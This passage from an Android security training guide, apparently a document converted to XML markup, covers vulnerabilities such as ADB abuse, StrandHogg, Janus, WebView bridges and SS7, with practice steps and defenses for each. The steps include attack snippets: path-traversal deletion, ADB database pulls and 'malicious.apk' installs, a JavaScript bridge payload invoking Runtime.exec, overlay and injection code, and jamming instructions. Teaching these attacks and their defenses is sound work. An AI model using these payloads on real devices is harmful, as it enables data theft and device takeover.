      <text:p text:style-name="Preformatted_20_Text">ContentResolver resolver = getContentResolver();</text:p>
      <text:p text:style-name="Preformatted_20_Text">Uri uri = Uri.parse("content://mms-sms/threads/../../../data/data/com.example.app/databases");</text:p>
      <text:p text:style-name="Preformatted_20_Text">resolver.delete(uri, null, null);</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Android security updates as they become available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Scoped Storage model (Android 10+)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement proper input validation in custom ContentProviders</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Run apps in isolated process sandboxes</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious file access patterns</text:p>
      <text:p text:style-name="Preformatted_20_Text">9. Android 17 Beta Automatic SIM PIN Feature (Security vs. Convenience)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android OS SIM management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Android 17 Beta 2 introduces "automatic SIM lock protection" that stores SIM PINs securely and automatically submits them after reboot . While designed to improve user experience and encourage SIM PIN adoption, this feature introduces a new attack surface. If an attacker gains access to the device after boot (bypassing lock screen), the system automatically unlocks the SIM without additional authentication. The feature is currently in testing for Pixel devices .</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Install Android 17 Beta on a test Pixel device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Enable the automatic SIM PIN feature</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Attempt to access SIM functions after various lock states</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Analyze how the PIN is stored and protected</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong device lock screen (biometric + PIN/password)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider keeping manual SIM PIN entry for high-security scenarios</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable full disk encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use remote wipe capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unauthorized SIM access attempts</text:p>
      <text:p text:style-name="Preformatted_20_Text">10. Android Debug Bridge (ADB) Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>Affected Component: ADB interface</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: ADB is a powerful debugging tool that, when enabled, provides extensive access to the device. Attackers can exploit ADB when users leave it enabled unintentionally or when connected to untrusted computers. Physical access with ADB enabled allows full filesystem access, app installation, and command execution. ADB over network (port 5555) is particularly dangerous as it allows remote attacks if enabled.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Enable Developer Options and USB Debugging on test device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use ADB commands to explore device access</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Attempt to install apps and access data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test ADB over network (adb connect)</text:p>
      <text:p text:style-name="Preformatted_20_Text"># ADB attack simulation</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb devices</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb pull /data/data/com.example.app/databases</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb install malicious.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell screencap /sdcard/screen.png</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Developer Options and USB Debugging when not in use</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong screen locks to prevent unauthorized ADB authorization</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor ADB authorization requests</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable ADB over network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use device management policies to enforce ADB restrictions</text:p>
      <text:p text:style-name="Preformatted_20_Text">11. Accessibility Service Abuse</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android Accessibility Service</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: The Accessibility Service, designed to help users with disabilities, has become one of the most abused Android permissions. Once enabled, it can read screen content, inject gestures, and control apps. Malware increasingly tricks users into enabling accessibility for malicious apps, allowing keylogging, credential theft, and bypassing lock screens. Banking trojans like Cerberus and EventBot specifically target this permission.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create a test app that requests Accessibility permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Demonstrate screen reading capabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Show how to simulate user interactions</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test detection mechanisms</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;!-- Accessibility service declaration --&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;service</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:name=".MaliciousAccessibilityService"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>&lt;action android:name="android.accessibilityservice.AccessibilityService" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;/intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;meta-data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>android:name="android.accessibilityservice"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>android:resource="@xml/accessibility_service_config" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/service&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Scrutinize apps requesting Accessibility permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Review installed accessibility services regularly</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement behavioral detection for unusual accessibility usage</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Educate users about social engineering tactics</text:p>
      <text:p text:style-name="Preformatted_20_Text">12. StrandHogg Vulnerability (Task Hijacking)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android task management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: StrandHogg (CVE-2020-0096) allows malicious apps to overlay their activities on top of legitimate apps, tricking users into entering credentials into fake login screens. The vulnerability exploits Android's task <text:soft-page-break/>affinity feature, allowing attackers to "hijack" tasks and insert their activities into legitimate app stacks. When users switch between apps, they may unknowingly interact with malicious overlays.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create a test app with specific task affinity settings</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Launch target legitimate app</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Trigger malicious overlay</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Demonstrate how users can be deceived</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;!-- Manifest configuration for task hijacking --&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:name=".MaliciousActivity"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:taskAffinity="com.target.app"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>android:launchMode="singleTask"&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>&lt;action android:name="android.intent.action.MAIN" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>&lt;category android:name="android.intent.category.LAUNCHER" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;/intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/activity&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Android security patches (fixed in April 2020 update)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Be cautious when switching between apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Check URL bars and app interfaces carefully</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use biometric authentication where possible</text:p>
      <text:p text:style-name="Preformatted_20_Text">13. Janus Vulnerability (APK Signature Bypass)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: APK signature verification</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Janus (CVE-2017-13156) allowed attackers to append malicious code to legitimate APK files without breaking their signatures. The vulnerability exploited Android's handling of DEX files, allowing attackers to create hybrid files that appear valid to both signature verification and the runtime. This enabled malware to masquerade as legitimate apps while maintaining original signatures.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Obtain a legitimate APK</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use Janus exploitation tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Append malicious DEX code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Install and test the modified APK</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Janus exploitation example</text:p>
      <text:p text:style-name="Preformatted_20_Text">java -jar janus.jar original.apk payload.dex output.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb install output.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Android security updates (fixed in December 2017)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Install apps only from Google Play Store</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use APK verification tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using APK signature scheme v2 and v3</text:p>
      <text:p text:style-name="Preformatted_20_Text">14. BlueBorne Bluetooth Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Bluetooth stack</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: BlueBorne is a set of Bluetooth vulnerabilities affecting billions of devices. Attackers can take over devices, spread malware, or establish man-in-the-middle positions without any user interaction. The vulnerabilities exist in the Bluetooth implementation itself, allowing remote code execution without pairing or user consent. This affects all Android versions prior to September 2017 security patches.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up Bluetooth testing environment with vulnerable devices</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use BlueBorne exploitation tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Practice in isolated network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor for successful exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/># BlueBorne scanner</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/armis-dev/blueborne-scanner.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd blueborne-scanner</text:p>
      <text:p text:style-name="Preformatted_20_Text">python blueborne_scanner.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply security patches</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable Bluetooth when not in use</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Bluetooth only in trusted environments</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep devices updated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious Bluetooth activity</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Application Layer Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">15. WebView JavaScript Bridge Exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android WebView</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: WebView components in Android apps often expose JavaScript bridges that allow web content to call native app functions. When improperly secured, attackers can exploit these bridges through XSS vulnerabilities or malicious web content. This can lead to arbitrary code execution, data theft, or privilege escalation. The addJavascriptInterface() method is particularly dangerous if used with untrusted content.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create a test app with WebView and JavaScript interface</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Load malicious HTML content</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Demonstrate JavaScript calling native methods</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test for proper URL validation</text:p>
      <text:p text:style-name="Preformatted_20_Text">// Vulnerable WebView configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">webView.addJavascriptInterface(new JSInterface(), "Android");</text:p>
      <text:p text:style-name="Preformatted_20_Text">webView.loadUrl("http://malicious-site.com");</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">// Malicious JavaScript</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;script&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Android.getClass().forName('java.lang.Runtime')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>.getMethod('getRuntime',null).invoke(null,null)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>.exec('id');</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/script&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use @JavascriptInterface annotation (Android 4.2+)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Validate URLs before loading</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable JavaScript if not needed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use setAllowFileAccess(false)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement CSP headers for loaded content</text:p>
      <text:p text:style-name="Preformatted_20_Text">16. Insecure Data Storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: App data storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Many Android apps store sensitive data insecurely, including credentials, tokens, and personal information. Common issues include:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Storing data in world-readable files</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Using insecure SharedPreferences without encryption</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Logging sensitive information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Caching data in external storage</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Not using Android Keystore for cryptographic keys</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Install target app on test device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use ADB to access app data directory</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Analyze databases, shared preferences, and files</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Check for sensitive information exposure</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Access app data (requires root or debug build)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">run-as com.target.app</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd /data/data/com.target.app/</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>ls -la</text:p>
      <text:p text:style-name="Preformatted_20_Text">sqlite3 databases/data.db .dump</text:p>
      <text:p text:style-name="Preformatted_20_Text">cat shared_prefs/config.xml</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Android Keystore for cryptographic keys</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Encrypt sensitive data with user credentials</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Store data in internal storage only</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use EncryptedSharedPreferences</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid logging sensitive information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement secure deletion</text:p>
      <text:p text:style-name="Preformatted_20_Text">17. Insecure Deep Linking</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android intents and URL handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Apps that improperly handle deep links can be exploited through malicious URLs. Attackers can craft links that trigger unintended actions, pass malicious data, or bypass authentication. This is particularly dangerous in OAuth flows and account linking scenarios. The vulnerability arises from insufficient validation of incoming intent data and URLs.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Analyze app's intent filters</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Create malicious intents targeting exported activities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Test URL schemes and deep links</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Attempt to pass malformed data</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;!-- Vulnerable intent filter --&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;action android:name="android.intent.action.VIEW" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;category android:name="android.intent.category.DEFAULT" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>&lt;data android:scheme="myapp" /&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">&lt;/intent-filter&gt;</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Validate all incoming intent data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use explicit intents for internal components</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Set android:exported="false" for internal components</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement proper URL validation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use Android App Links with domain verification</text:p>
      <text:p text:style-name="Preformatted_20_Text">18. Tapjacking (Overlay Attacks)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android window management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Tapjacking attacks use malicious overlays to trick users into clicking invisible buttons that perform unintended actions. Attackers create translucent windows that capture taps and forward them to underlying applications. This can lead to installing malware, granting permissions, or authorizing payments without user awareness. The SYSTEM_ALERT_WINDOW permission is particularly dangerous.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Create an app with SYSTEM_ALERT_WINDOW permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Draw overlay windows with captured click handling</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Position overlays over critical UI elements</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Demonstrate tapjacking scenarios</text:p>
      <text:p text:style-name="Preformatted_20_Text">// Tapjacking overlay creation</text:p>
      <text:p text:style-name="Preformatted_20_Text">WindowManager.LayoutParams params = new WindowManager.LayoutParams(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>WindowManager.LayoutParams.MATCH_PARENT,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>WindowManager.LayoutParams.MATCH_PARENT,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>PixelFormat.TRANSLUCENT);</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use android:filterTouchesWhenObscured="true" in sensitive views</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Set FLAG_WINDOW_IS_OBSCURED checks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Warn users about overlay permissions</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Limit SYSTEM_ALERT_WINDOW permission</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Implement secure input methods</text:p>
      <text:p text:style-name="Preformatted_20_Text">19. Fragment Injection</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android fragment management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Fragment injection vulnerabilities occur when apps use PreferenceActivity with improper validation of fragment names. Attackers can inject arbitrary fragments by passing malicious intent extras, potentially loading unauthorized UI components or exposing sensitive functionality. This affects apps extending PreferenceActivity without proper fragment validation.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Identify apps using PreferenceActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Analyze fragment handling code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Create intents with malicious fragment names</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test for unauthorized fragment loading</text:p>
      <text:p text:style-name="Preformatted_20_Text">// Vulnerable PreferenceActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text">Intent intent = new Intent();</text:p>
      <text:p text:style-name="Preformatted_20_Text">intent.putExtra(":android:show_fragment", "com.malicious.Fragment");</text:p>
      <text:p text:style-name="Preformatted_20_Text">startActivity(intent);</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Override isValidFragment() to validate fragment names</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use PreferenceFragmentCompat from AndroidX</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Avoid exporting PreferenceActivity</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Validate all intent parameters</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep Android support libraries updated</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Network &amp; Protocol Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">20. SS7 Protocol Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Signaling System No. 7 (SS7)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: SS7 is the backbone protocol for global telecom networks, designed decades ago without security considerations. Attackers who gain access to SS7 networks can track device locations, intercept SMS messages (including 2FA codes), forward calls, and disable service. This affects all mobile devices regardless of OS. Commercial SS7 access is available through various brokers, and numerous attacks have been documented.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up SS7 testing environment with open-source tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use software-defined radio and openBSC</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Practice in isolated laboratory network</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor SS7 message flows</text:p>
      <text:p text:style-name="Preformatted_20_Text"># SS7 testing tools</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/ernw/ss7MAPer.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd ss7MAPer</text:p>
      <text:p text:style-name="Preformatted_20_Text">./ss7maper.py --help</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use app-based 2FA instead of SMS</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable SS7 filtering at carrier level</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for suspicious SMS patterns</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted messaging apps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider hardware security keys (FIDO2)</text:p>
      <text:p text:style-name="Preformatted_20_Text">21. 4G/5G Downgrade Attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Mobile network protocols</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Despite improved security in 4G and 5G networks, attackers can force devices to downgrade to 2G or 3G connections where security is weaker. This is accomplished through fake base stations or by jamming 4G/5G frequencies. Once downgraded, attackers can use IMSI catchers and interception tools to capture traffic. The attack exploits the lack of backward compatibility security in device implementations.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up jamming equipment for specific frequency bands</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Configure fake base stations for 2G/3G</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>3. Monitor device connection behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Practice in Faraday-caged environment</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable 2G/3G on device when possible</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use "LTE only" or "5G only" mode</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable network encryption requirements</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use VPN for all traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unexpected network changes</text:p>
      <text:p text:style-name="Preformatted_20_Text">22. Wi-Fi Calling Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Wi-Fi calling implementation</text:p>
